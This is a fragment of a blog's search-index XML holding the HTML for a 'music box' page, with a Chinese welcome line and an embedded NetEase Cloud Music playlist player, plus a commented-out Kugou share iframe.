        <content type="html"><![CDATA[<main class="layout" id="content-inner">    <div id="page">        <div id="article-container">            <span class="p center logo h2 blue">                <b>( ＾∀＾）／欢迎光临八音盒，希望舒缓的音乐能带走你一天的疲劳~!＼( ＾∀＾）</b>            </span>    <br>    <br></main>    <blockquote><p>来源：网易云音乐</p></blockquote>    <div id="aplayer-CTvDwbcj" class="aplayer aplayer-tag-marker meting-tag-marker"         data-id="12952460159" data-server="netease" data-type="playlist" data-mode="circulation" data-autoplay="false" data-mutex="false" data-listmaxheight="400px" data-preload="none" data-theme="#ad7a86"    ></div><!-- <iframe  frameborder="no" border="0"  marginwidth="0" marginheight="0"  width=530 height=310  src="//activity.kugou.com/share/v-a00a45b0/index.html?u=1045443904&h1=240987975537390846260097417101362365343&h2=483a904874cd4093b4e2381eaea94080&specialid=-2147483648&global_specialid=collection_3_1045443904_16_0&cType=0"></iframe> -->]]></content>
      
    </entry>
    
    
  
</search>
